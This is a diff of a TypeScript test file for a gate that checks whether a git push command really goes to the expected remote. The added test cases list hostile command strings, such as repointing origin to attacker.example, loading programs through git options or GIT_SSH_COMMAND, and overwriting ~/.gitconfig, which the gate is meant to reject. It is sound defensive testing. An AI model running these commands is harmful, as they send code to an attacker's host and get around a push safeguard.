@@ -270,8 +270,9 @@ describe("gate-measured git push provenance (#63)", () => {
 			]) {
 				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
 			}
-			// A prefix assignment on another command changes only that command.
-			expect(measureGitPushProvenance("CI=1 bun test && git push origin main", dir)?.forwardOnly).toBe(true);
+			// A test runner runs code its words do not show, which could repoint the
+			// remote before the push (#173): only an allowlisted segment may come first.
+			expect(measureGitPushProvenance("CI=1 bun test && git push origin main", dir)).toBeUndefined();
 		} finally {
 			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
 		}
@@ -311,6 +312,44 @@ describe("gate-measured git push provenance (#63)", () => {
 				"printf x > notes.txt && git push origin main",
 				"sed -i '' 's/example.invalid/attacker.example/' .git/config && git push origin main",
 				"cp evil.conf .git/config && git push origin main",
+				// Review of #174: git subcommands that run a program named on the command line.
+				"git rebase -x 'git remote set-url origin https://attacker.example/x.git' HEAD~1 && git push origin main",
+				"git submodule foreach 'git remote set-url origin x' && git push origin main",
+				"git bisect run ./set-url.sh && git push origin main",
+				"git filter-branch --tree-filter true && git push origin main",
+				"git amend && git push origin main",
+				"git fetch --upload-pack='sh -c x' origin && git push origin main",
+				"git fetch --upload-p='sh -c x' origin && git push origin main",
+				"git merge -s evil b && git push origin main",
+				"git merge --strategy=evil b && git push origin main",
+				"git log --output=x && git push origin main",
+				// Wrappers in front of shell state or git.
+				'command eval "git remote set-url origin x" && git push origin main',
+				"builtin source ./env.sh && git push origin main",
+				"env -i X=1 git remote set-url origin x && git push origin main",
+				"env -S 'git remote set-url origin x' && git push origin main",
+				"nohup git remote set-url origin x && git push origin main",
+				"time git remote set-url origin x && git push origin main",
+				"xargs git remote set-url origin < urls && git push origin main",
+				"sudo sh -c 'git remote set-url origin x' && git push origin main",
+				"env bash -c 'git remote set-url origin x' && git push origin main",
+				"python3 -c \"import os; os.system('git remote set-url origin x')\" && git push origin main",
+				"node -e \"require('child_process').execSync('git config remote.origin.url x')\" && git push origin main",
+				// Writes to the global or XDG git config, through a program or an environment.
+				"tee -a ~/.gitconfig < evil && git push origin main",
+				"cp evil ~/.config/git/config && git push origin main",
+				"mv evil ~/.gitconfig && git push origin main",
+				"install -m 644 evil ~/.gitconfig && git push origin main",
+				"ln -sf evil ~/.gitconfig && git push origin main",
+				"GIT_CONFIG_GLOBAL=evil git status && git push origin main",
+				"GIT_SSH_COMMAND='sh -c x' git fetch && git push origin main",
+				// A loop or a background job runs the later words first.
+				"for u in x; do git push origin main; git remote set-url origin $u; done",
+				"git push origin main & git remote set-url origin x",
+				// A pipeline stage after the push runs alongside it.
+				"git push origin main | git remote set-url origin x",
+				// A substitution in the push's own words runs before it.
+				"git push origin $(git remote set-url origin x; echo main)",
 			]) {
 				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
 			}
@@ -318,8 +357,13 @@ describe("gate-measured git push provenance (#63)", () => {
 				// A function name inside a quoted string is not a function definition.
 				'git commit -q --allow-empty -m "fix foo()" && git push origin main',
 				"git status 2>&1 && git push origin main",
-				"CI=1 bun test && git push origin main",
-				'git push -u origin main && gh pr create --title "fix git push" --body "git remote stays"',
+				"git add -A && git commit -q --allow-empty -m next && git push origin main",
+				"git merge --squash -q main && git push origin main",
+				"cd . && git log --oneline -1 | head -1 && git push origin main",
+				"git push origin main 2>&1 | tail -5",
+				// What runs after the push in a plain sequence cannot change it.
+				'git push -u origin main && gh pr create --title "fix git push" --body "$(cat body.md)"',
+				"git push origin main; CI=1 bun test",
 			]) {
 				expect(measureGitPushProvenance(command, dir)?.forwardOnly, command).toBe(true);
 			}
@@ -345,6 +389,19 @@ describe("gate-measured git push provenance (#63)", () => {
 			expect(measureGitPushProvenance("git push origin main", dir)).toBeUndefined();
 			git("git config --remove-section url.https://attacker.example/", dir);
 			expect(measureGitPushProvenance("git push origin main", dir)?.forwardOnly).toBe(true);
+			// A rewrite in the global config counts too: git reads every scope.
+			const globalConfig = join(dir, "global.gitconfig");
+			git(`git config --file ${JSON.stringify(globalConfig)} url.https://attacker.example/.pushInsteadOf https://example.invalid/`, dir);
+			// A child process, because the gate's git calls take this process's
+			// environment as it was at startup.
+			const measureUnder = (globalPath: string): string =>
+				execSync(`bun -e ${JSON.stringify(`import { measureGitPushProvenance } from ${JSON.stringify(join(import.meta.dir, "..", "jev.ts"))}; console.log(JSON.stringify(measureGitPushProvenance("git push origin main", ${JSON.stringify(dir)}) ?? null))`)}`, {
+					env: { ...GIT_ENV, GIT_CONFIG_GLOBAL: globalPath },
+				})
+					.toString()
+					.trim();
+			expect(measureUnder(globalConfig)).toBe("null");
+			expect(JSON.parse(measureUnder("/dev/null"))?.forwardOnly).toBe(true);
 			// A second url pushes to both, while `config --get` reports only one.
 			git("git remote set-url --add origin https://attacker.example/x.git", dir);
 			expect(measureGitPushProvenance("git push origin main", dir)).toBeUndefined();
